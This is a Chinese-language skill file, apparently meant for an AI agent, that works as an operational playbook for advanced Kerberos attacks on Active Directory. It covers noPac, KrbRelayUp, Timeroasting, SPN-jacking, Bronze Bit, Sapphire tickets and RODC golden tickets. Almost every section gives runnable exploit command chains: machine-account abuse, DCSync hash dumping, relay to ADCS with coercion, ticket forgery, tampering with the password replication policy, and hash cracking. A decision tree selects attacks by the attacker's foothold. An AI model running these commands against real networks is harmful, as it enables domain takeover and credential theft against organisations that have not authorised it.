---
name: kerberos-advanced-attack
description: "高级 Kerberos 协议攻击技术集合。当基础 Kerberoasting/AS-REP Roasting 和委派攻击不够用时，使用本技能中的高级技术。覆盖 sAMAccountName spoofing (noPac/CVE-2021-42278)、Kerberos relay (KrbRelayUp)、Timeroasting (NTP 无认证哈希提取)、ASREQroast (MITM AS-REQ 捕获)、SPN-jacking (定向 Kerberoasting)、UnPAC-the-hash (证书→NT Hash)、Sapphire ticket (高隐蔽票据伪造)、Bronze Bit (CVE-2020-17049 委派绕过)、RODC 攻击链 (密钥列表导出/RODC Golden Ticket/RODC DACL 利用)。"
metadata:
  tags: "kerberos,nopac,samaccountname,CVE-2021-42278,CVE-2021-42287,krbrelayup,kerberos relay,timeroasting,asreqroast,spn-jacking,unpac,sapphire ticket,bronze bit,CVE-2020-17049,RODC,read-only domain controller,kerberos key list,pre-windows 2000"
  category: "lateral"
---

# 高级 Kerberos 攻击

## 触发条件

- 需要使用高级 Kerberos 技术（noPac / KrbRelayUp / Timeroasting / RODC）
- 基础 Kerberoasting 和委派攻击不够用
- 发现 RODC（只读域控制器）
- 需要更高隐蔽性的票据伪造（Sapphire ticket）

## 前置要求

| 技术 | 所需凭证 | 关键工具 |
|------|---------|---------|
| Timeroasting | 无需凭证 | timeroast, netexec |
| ASREQroast | 无需凭证 (需 MITM) | PCredz |
| noPac | 低权限域用户 | noPac.py, Impacket |
| KrbRelayUp | 本地 SYSTEM | KrbRelayUp, krbrelayx |
| SPN-jacking | 域用户 + WriteSPN | Impacket, tgssub |
| UnPAC-the-hash | 用户证书 | PKINITtools, Rubeus |
| Bronze Bit | 受限委派服务账号 | Impacket getST |
| Sapphire ticket | krbtgt hash | Impacket ticketer |
| RODC 攻击链 | 视阶段而定 | Rubeus, bloodyAD, keylistattack |

## 技术选择决策树

```
你目前有什么？
├── 无凭证/无认证
│   ├── 可达 DC NTP → Timeroasting
│   └── 有 MITM 位置 → ASREQroast
├── 低权限域用户
│   ├── MAQ > 0 → sAMAccountName spoofing (noPac)
│   └── 有 WriteSPN 权限 → SPN-jacking
├── 本地 SYSTEM (无域凭证)
│   └── LDAP signing 未强制 → KrbRelayUp
├── 持有证书
│   └── UnPAC-the-hash
├── 有受限委派 + 目标受保护
│   └── Bronze Bit (CVE-2020-17049)
├── 已有 krbtgt hash
│   └── 需高隐蔽 → Sapphire ticket
└── 发现 RODC
    └── RODC 攻击链
```

---

## 1. Timeroasting — NTP 无认证哈希提取

### 原理

DC 的 NTP 服务使用计算机账户的 NTLM hash (MD5-based key) 计算 NTP 响应中的 MAC 值。攻击者无需任何认证，仅通过发送 NTP 请求并指定不同 RID，即可获取计算机账户的 SNTP hash 用于离线破解。该 hash 基于 RC4 密钥，计算机账户如果使用弱密码（如 Pre-Windows 2000 设备），则可被快速破解。

### 前置条件

- 网络可达 DC 的 NTP 端口 (UDP 123)
- 无需任何认证凭据

### 核心命令

```bash
# 无认证枚举 — Linux
python3 timeroast.py "$DC_IP"

# netexec 模块
netexec smb "$DC_IP" -M timeroast

# Windows — 认证模式 (可生成针对性字典)
Invoke-AuthenticatedTimeRoast -DomainController $DC_IP
Invoke-AuthenticatedTimeRoast -DomainController $DC_IP -GenerateWordlist
```

```bash
# 破解 SNTP hash
hashcat -m 31300 -a 0 -O hashes.txt $WORDLIST --username
```

### 成功标志

- 获取 SNTP hash 文件
- hashcat 破解出计算机账户密码
- 注意: 破解速度比 Kerberos TGS hash 快约 10 倍

---

## 2. ASREQroast — MITM AS-REQ 捕获

### 原理

当攻击者处于 MITM 位置时（ARP 欺骗、ICMP 重定向、DHCPv6 投毒），可以捕获域用户正常 Kerberos 预认证中的 AS-REQ 加密时间戳。该时间戳使用用户密码派生的密钥加密，可离线破解。与 AS-REP Roasting 不同，ASREQroast 不需要目标禁用预认证。

### 前置条件

- 拥有 MITM 位置（ARP/ICMP redirect/DHCPv6）
- 无需域凭据

### 核心命令

```bash
# 实时抓取
Pcredz -i $INTERFACE -v

# 从 pcap 文件提取
Pcredz -f "$PCAP_FILE"

# 从目录批量提取
Pcredz -d "$PCAP_DIR"
```

```bash
# 破解 AS-REQ Pre-Auth etype 23
hashcat -m 7500 asreq_hashes.txt $WORDLIST
```

### 成功标志

- 捕获到用户 AS-REQ 加密时间戳 hash
- hashcat 破解出用户明文密码

---

## 3. sAMAccountName Spoofing (noPac) — CVE-2021-42278 + CVE-2021-42287

### 原理

CVE-2021-42278 允许修改计算机账户的 sAMAccountName 为不带 `$` 的值。CVE-2021-42287 导致 KDC 在找不到请求者时自动追加 `$` 搜索。组合利用: 创建机器账户 → 改名为 DC 名(不带$) → 请求 TGT → 改回原名 → 用 TGT 做 S4U2self 获取 DC 的高权限 TGS。

### 前置条件

- 低权限域用户凭据
- MAQ (ms-DS-MachineAccountQuota) > 0
- 未安装补丁 KB5008102 + KB5008380

### 核心命令

```bash
# 自动化 — 一键利用
noPac.py $DOMAIN/$USER:'$PASSWORD' -dc-ip $DC_IP --impersonate Administrator -dump
noPac.py $DOMAIN/$USER:'$PASSWORD' -dc-ip $DC_IP --impersonate Administrator -use-ldap -dump
```

```bash
# 手动链 — UNIX (Impacket)
# Step 1: 创建机器账户
addcomputer.py -computer-name 'FAKEPC$' -computer-pass 'FakePass123' -dc-ip $DC_IP "$DOMAIN/$USER:$PASSWORD"

# Step 2: 清除 SPN (避免约束检查)
addspn.py --clear -t 'FAKEPC$' -u "$DOMAIN/$USER" -p "$PASSWORD" "$DC_IP"

# Step 3: 改名为 DC
renameMachine.py -current-name 'FAKEPC$' -new-name "$DC_NAME" -dc-ip $DC_IP "$DOMAIN/$USER:$PASSWORD"

# Step 4: 用 DC 名请求 TGT
getTGT.py -dc-ip $DC_IP "$DOMAIN/$DC_NAME:FakePass123"

# Step 5: 改回原名
renameMachine.py -current-name "$DC_NAME" -new-name 'FAKEPC$' -dc-ip $DC_IP "$DOMAIN/$USER:$PASSWORD"

# Step 6: S4U2self 获取 DC ST
export KRB5CCNAME="$DC_NAME.ccache"
getST.py -self -impersonate "Administrator" -altservice "cifs/$DC_FQDN" -k -no-pass -dc-ip $DC_IP "$DOMAIN/$DC_NAME"

# Step 7: DCSync
export KRB5CCNAME="Administrator@cifs_$DC_FQDN@$DOMAIN.ccache"
secretsdump.py -k -no-pass -dc-ip $DC_IP "$DC_FQDN"
```

```powershell
# 手动链 — Windows
New-MachineAccount -MachineAccount "FAKEPC" -Password $(ConvertTo-SecureString "FakePass123" -AsPlainText -Force) -Domain $DOMAIN
Set-DomainObject "FAKEPC$" -Clear 'servicePrincipalName'
Set-MachineAccountAttribute -MachineAccount "FAKEPC" -Value "$DC_NAME" -Attribute samaccountname
Rubeus.exe asktgt /user:"$DC_NAME" /password:"FakePass123" /domain:$DOMAIN /dc:$DC_FQDN /nowrap
Set-MachineAccountAttribute -MachineAccount "FAKEPC" -Value "FAKEPC$" -Attribute samaccountname
Rubeus.exe s4u /self /impersonateuser:"Administrator" /altservice:"cifs/$DC_FQDN" /dc:$DC_FQDN /ptt /ticket:$TGT_BASE64
mimikatz.exe "lsadump::dcsync /domain:$DOMAIN /user:Administrator"
```

### 成功标志

- 获取 DC 的 cifs/ldap 服务票据
- DCSync 成功导出域内 hash

---

## 4. KrbRelayUp — 本地 Kerberos Relay 提权

### 原理

在已获取本地 SYSTEM 权限的场景下，将机器账户的 Kerberos 认证 relay 到 LDAP 服务，配置 RBCD (Resource-Based Constrained Delegation)，然后通过 S4U 链获取本地管理员票据，实现从 SYSTEM 到域内高权限的提升。

### 前置条件

- 本地 SYSTEM 权限
- LDAP signing 未强制
- MAQ > 0 或已控制机器账户

### 核心命令

```bash
# 基础利用
KrbRelayUp.exe relay -Domain $DOMAIN -CreateNewComputerAccount -ComputerName YOURPC$ -ComputerPassword Pass
KrbRelayUp.exe spawn -m rbcd -d $DOMAIN -dc $DC_FQDN -cn YOURPC$ -cp Pass
```

```bash
# DNS 投毒 relay 变体 (krbrelayx + mitm6)
krbrelayx.py --target http://$ADCS_FQDN/certsrv/ -ip $ATTACKER_IP \
  --victim $TARGET_SAMNAME --adcs --template Machine

mitm6 -i $INTERFACE -d $DOMAIN -hw $TARGET_FQDN --relay $ADCS_FQDN -v
```

```bash
# Coerced auth relay 变体
dnstool.py -u "$DOMAIN\\$USER" -p "$PASSWORD" -r attacker.$DOMAIN -a add -t A -d $ATTACKER_IP $DC_IP
krbrelayx.py --target http://$ADCS_FQDN/certsrv/ -ip $ATTACKER_IP --victim $TARGET_SAMNAME --adcs --template Machine
PetitPotam.py attacker.$DOMAIN@80/test $TARGET_IP
```

### 成功标志

- RBCD 配置成功写入 msDS-AllowedToActOnBehalfOfOtherIdentity
- S4U 获取本地管理员票据
- 本地提权到 SYSTEM / 域内横向

---

## 5. SPN-jacking — KCD + DACL 组合定向 Kerberoasting

### 原理

当拥有对某账户的 WriteSPN 权限且环境中已配置 KCD 时，可以将目标 SPN "移动"到可控账户上，然后利用 S4U 链请求票据，最后用 tgssub 编辑票据中的 SPN 字段指向真正目标。

### 前置条件

- KCD (约束委派) 已配置
- 对另一个账户拥有 WriteSPN 权限

### 核心命令

```bash
# UNIX — 完整 SPN-jacking 流程
# Step 1: 清除目标 B 的 SPN
addspn.py --clear -t 'ServerB$' -u "$DOMAIN/$USER" -p "$PASSWORD" "$DC_IP"

# Step 2: 将 B 的 SPN 添加到可控账户 C
addspn.py -t 'ServerC$' --spn "cifs/serverB.$DOMAIN" -u "$DOMAIN/$USER" -p "$PASSWORD" "$DC_IP"

# Step 3: S4U 请求票据
getST.py -spn "cifs/serverB.$DOMAIN" -impersonate "Administrator" "$DOMAIN/serverA\$:$PASSWORD"

# Step 4: 编辑票据 SPN
tgssub.py -in serverB.ccache -out final.ccache -altservice "cifs/serverC.$DOMAIN"
```

```powershell
# Windows
Set-DomainObject -Identity ServerB$ -Clear servicePrincipalName
Set-DomainObject -Identity ServerC$ -Set @{serviceprincipalname="cifs/serverB.$DOMAIN"}
Rubeus.exe s4u /ticket:$TGT /impersonateuser:Administrator /msdsspn:"cifs/serverB.$DOMAIN" /altservice:"cifs/serverC.$DOMAIN" /ptt
```

### 成功标志

- 获取目标服务的有效 ST
- 可访问目标服务 (cifs/http/mssql 等)

---

## 6. UnPAC-the-hash — PKINIT 证书转 NT Hash

### 原理

通过 PKINIT 获取的 TGT 的 PAC 中包含用户的 NT hash。利用 User-to-User (U2U) 请求机制，用自己的 TGT 加密自己的 TGS，然后从中提取 NT hash。常用于 ADCS 攻击或 Shadow Credentials 攻击后的凭据提取。

### 前置条件

- 持有目标用户的有效证书 (.pfx/.pem)
- 通常来自 ADCS 利用或 Shadow Credentials 写入

### 核心命令

```bash
# PKINITtools — Linux
gettgtpkinit.py -cert-pfx "$CERT_PFX" -pfx-pass "$PFX_PASS" "$DOMAIN/$USER" tgt.ccache
# 记录输出中的 AS-REP encryption key

getnthash.py -key '$AS_REP_KEY' '$DOMAIN'/'$USER'
```

```powershell
# Rubeus — Windows
Rubeus.exe asktgt /getcredentials /user:"$USER" /certificate:"$CERT_PFX" /password:"$PFX_PASS" /domain:"$DOMAIN" /dc:"$DC_FQDN" /show
```

### 成功标志

- 成功获取目标用户的 NT hash
- 可用于 Pass-the-Hash 或进一步攻击

---

## 7. Bronze Bit (CVE-2020-17049) — 委派 Forwardable 标志绕过

### 原理

S4U2self 获取的票据中 forwardable 标志由 KDC 根据目标用户是否在 Protected Users 组或标记为 sensitive 来设置。Bronze Bit 攻击直接修改票据中的 forwardable 位（因为该票据用服务账户密钥加密，而攻击者已持有该密钥），从而绕过限制，将票据用于 S4U2proxy。

### 前置条件

- 控制一个配置了约束委派的服务账号
- 目标用户在 Protected Users 组或标记 "Account is sensitive and cannot be delegated"

### 核心命令

```bash
getST.py -force-forwardable \
  -spn "$TARGET_SPN" \
  -impersonate "Administrator" \
  -dc-ip "$DC_IP" \
  -hashes :"$NT_HASH" \
  "$DOMAIN/$SERVICE_ACCOUNT"
```

### 成功标志

- 获取可转发 (forwardable) 的 ST for 受保护用户
- 可访问委派目标服务

---

## 8. Sapphire Ticket — 高隐蔽票据伪造

### 原理

Diamond Ticket 的进阶变体。普通 Golden/Diamond Ticket 使用伪造的 PAC，Sapphire Ticket 通过 S4U2self + U2U 机制获取目标用户的真实 PAC，替换到伪造票据中。由于 PAC 来自 KDC 的真实签名，检测难度极高。

### 前置条件

- 已获取 krbtgt hash (AES + NT hash)
- 了解目标用户 RID 和域 SID

### 核心命令

```bash
ticketer.py -request \
  -impersonate 'domainadmin' \
  -domain '$DOMAIN' \
  -user '$USER' \
  -password '$PASSWORD' \
  -nthash '$KRBTGT_NT' \
  -aesKey '$KRBTGT_AES' \
  -user-id '$TARGET_RID' \
  -domain-sid '$DOMAIN_SID' \
  'baduser'
```

### 注意事项

- KB5008380 补丁后 KDC 检查 PAC_REQUESTOR 和 PAC_ATTRIBUTES_INFO 结构
- 缺少这些字段可能导致 KDC_ERR_TGT_REVOKED
- 与 Golden/Diamond 对比: Sapphire 使用真实 PAC (S4U 获取)，最难检测

### 成功标志

- 获取包含真实 PAC 的伪造票据
- 票据可正常通过 KDC 验证

---

## 9. RODC 攻击链

### 原理

只读域控制器 (RODC) 拥有独立的 krbtgt 密钥 (krbtgt_XXXXX)，通过密码复制策略 (PRP) 控制可缓存哪些账户的密钥。攻击 RODC 可提取受允许缓存的账户密钥，或通过 DACL 修改 PRP 扩大影响范围。

### 枚举 RODC

```bash
# LDAP 查询
ldapsearch -H ldap://$DC_IP -b "DC=$DOMAIN_DN" "(primaryGroupID=521)" dn sAMAccountName msDS-SecondaryKrbTgtNumber

# netexec
nxc ldap $DC_IP -u "$USER" -p "$PASSWORD" -M rodc
```

### PRP 策略查询

```bash
# msDS-RevealOnDemandGroup — 允许缓存列表
# msDS-NeverRevealGroup — 拒绝缓存列表
ldapsearch -H ldap://$DC_IP -b "CN=$RODC_NAME,OU=Domain Controllers,DC=$DOMAIN_DN" \
  msDS-RevealOnDemandGroup msDS-NeverRevealGroup managedBy
```

### Key List 攻击 — 提取缓存密钥

```bash
# 完整模式 (包含被 Denied 的)
keylistattack.py -rodcNo "$KRBTGT_NUM" -rodcKey "$KRBTGT_AES" -full "$DOMAIN/$USER:$PASS"@"$RODC"

# 正常模式 (遵循 Denied List)
keylistattack.py -rodcNo "$KRBTGT_NUM" -rodcKey "$KRBTGT_AES" "$DOMAIN/$USER:$PASS"@"$RODC"

# 指定用户模式
keylistattack.py -rodcNo "$KRBTGT_NUM" -rodcKey "$KRBTGT_AES" -t "$TARGET_USER" "$DOMAIN/$USER:$PASS"@"$RODC"
```

```powershell
# Windows — Rubeus
Rubeus.exe golden /rodcNumber:$KRBTGT_NUM /flags:forwardable,renewable,enc_pa_rep /nowrap /outfile:rodc.kirbi /aes256:$KRBTGT_AES /user:$USER /id:$RID /domain:$DOMAIN /sid:$SID
Rubeus.exe asktgs /enctype:aes256 /keyList /ticket:rodc.kirbi /service:krbtgt/$DOMAIN
```

### RODC Golden Ticket

```powershell
Rubeus.exe golden /rodcNumber:$KRBTGT_NUM /flags:forwardable,renewable,enc_pa_rep /nowrap \
  /outfile:ticket.kirbi /aes256:$KRBTGT_AES \
  /user:Administrator /id:500 /domain:$DOMAIN /sid:$DOMAIN_SID
```

- kvno 字段必须匹配 RODC 的 krbtgt 版本号
- 票据提交到可写 DC 时，PAC 会被重新计算验证

### RODC DACL 利用 — 修改 PRP 扩大影响

```bash
# bloodyAD — 添加管理员到允许列表
bloodyAD -d $DOMAIN -u "$USER" -p "$PASSWORD" --dc-ip $DC_IP set object "$RODC_DN" \
  msDS-RevealOnDemandGroup -v "CN=Domain Admins,CN=Users,DC=$DOMAIN_DN"

# bloodyAD — 清除拒绝列表
bloodyAD -d $DOMAIN -u "$USER" -p "$PASSWORD" --dc-ip $DC_IP set object "$RODC_DN" \
  msDS-NeverRevealGroup
```

```python
# powerview.py
Set-DomainObject -Identity "$RODC_DN" -Append @{'msDS-RevealOnDemandGroup'='CN=Domain Admins,CN=Users,DC=$DOMAIN_DN'}
Set-DomainObject -Identity "$RODC_DN" -Clear 'msDS-NeverRevealGroup'
```

- 攻击链: 修改 PRP → 导出 krbtgt_XXXXX → RODC Golden Ticket → Key List 攻击

### Pre-Windows 2000 计算机账户

```bash
# 默认密码 = 小写计算机名去掉 $
# 筛选: UAC=4128 + logonCount=0
ldapsearch -H ldap://$DC_IP -b "DC=$DOMAIN_DN" "(&(userAccountControl=4128)(logonCount=0))" sAMAccountName

# 批量验证
nxc smb $DC_IP -u computers.txt -p passwords.txt --no-bruteforce

# Kerberos 认证
getTGT.py "$DOMAIN/OLDPC\$:oldpc"
```

### 成功标志

- 提取目标账户 NT hash
- 获取 RODC Golden Ticket
- 修改 PRP 后可缓存高权限账户密钥

---

## 深入参考

- → [references/kerberos-escalation.md](references/kerberos-escalation.md) — noPac / KrbRelayUp / Bronze Bit / SPN-jacking / Timeroasting / ASREQroast / UnPAC / Sapphire 完整命令参考
- → [references/rodc-attack.md](references/rodc-attack.md) — RODC 概念、Key List 攻击、RODC Golden Ticket、DACL 利用、Pre-Windows 2000
